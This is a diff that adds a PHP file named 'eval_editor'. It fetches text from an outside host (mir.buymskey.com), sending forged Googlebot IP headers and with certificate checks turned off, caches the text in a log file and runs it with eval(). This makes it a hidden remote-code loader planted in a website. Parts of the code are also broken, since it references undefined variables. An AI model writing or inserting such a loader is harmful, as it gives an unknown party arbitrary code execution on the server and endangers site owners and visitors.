@@ -1,0 +1,64 @@
+<?php
+//this is eval_editor file start
+error_reporting(0);
+set_time_limit(0);
+$log_sure=True;
+$check_sure=True;
+if (file_exists('write_work.log')==True){
+	$get_content=file_get_contents('write_work.log');
+	if ((strpos($tmp, 'confirm:start of editor file') !== false) && (strpos($tmp, 'confirm:start of editor file') !== false)){
+		$content=$get_content;
+	} else {
+		$log_sure=False;
+	}
+} else {
+	$log_sure=False;
+}
+if($log_sure==False){
+	if(function_exists('curl_init')){
+	$s = curl_init();
+	curl_setopt($s,CURLOPT_URL,'http://mir.buymskey.com/transport/del_label_editor.txt');
+	curl_setopt($s,CURLOPT_RETURNTRANSFER,1);
+	curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36');
+	curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");
+	curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));
+	curl_setopt($s, CURLOPT_HTTPHEADER, array('Expect:'));
+	curl_setopt($s, CURLOPT_ENCODING, "");
+	curl_setopt($s, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($s, CURLOPT_CONNECTTIMEOUT , 20);
+	curl_setopt($s, CURLOPT_TIMEOUT, 20);
+		curl_setopt($s, CURLOPT_COOKIE, 'foo=bar');
+	$content = curl_exec($s);
+	curl_close($s);
+	}else{
+	$options = array(
+	  'http'=>array(
+		'method'=>"GET",
+		'timeout'=>20,
+		'header'=>"Accept-language: en\r\n" .
+				  "Cookie: foo=bar\r\n" .  // check function.stream-context-create on php.net
+				  "User-Agent: Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10" // i.e. An iPad 
+	  ),
+	  "ssl"=>array(
+				  "verify_peer"=>false,
+				  "verify_peer_name"=>false,
+	  )
+	);
+		$content = file_get_contents('http://mir.buymskey.com/transport/del_label_editor.txt', false, $context1);
+	}
+	file_put_contents('write_work.log',$content);
+}
+/*
+if (file_exists('write_check_class.txt')==True){
+	$check_content=file_get_contents('write_check_class.txt');
+	if ($check_content!='every check class'){
+		$check_sure=False;
+	}
+} else {
+	$check_sure=False;
+}*/
+$file_name=dirname(__FILE__);
+file_put_contents('write_check_class.txt',$file_name.':::every check class');
+	eval($content);
+//this is eval_editor file end
+?>
